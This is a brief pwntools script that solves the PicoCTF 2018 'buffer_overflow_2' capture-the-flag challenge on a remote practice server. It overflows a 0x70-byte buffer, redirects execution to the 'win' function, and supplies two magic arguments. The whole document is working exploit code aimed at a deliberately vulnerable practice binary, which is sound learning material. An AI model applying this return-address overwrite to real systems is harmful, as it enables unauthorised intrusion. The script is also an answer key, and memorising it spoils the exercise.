from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('PicoCTF_2018_buffer_overflow_2')
io = remote('node4.buuoj.cn', 29523)
elf = ELF('PicoCTF_2018_buffer_overflow_2')
win = elf.symbols['win']

payload = cyclic(0x70) + p32(win) + cyclic(4) + p32(0xDEADBEEF) + p32(0xDEADC0DE)
io.sendline(payload)
io.interactive()

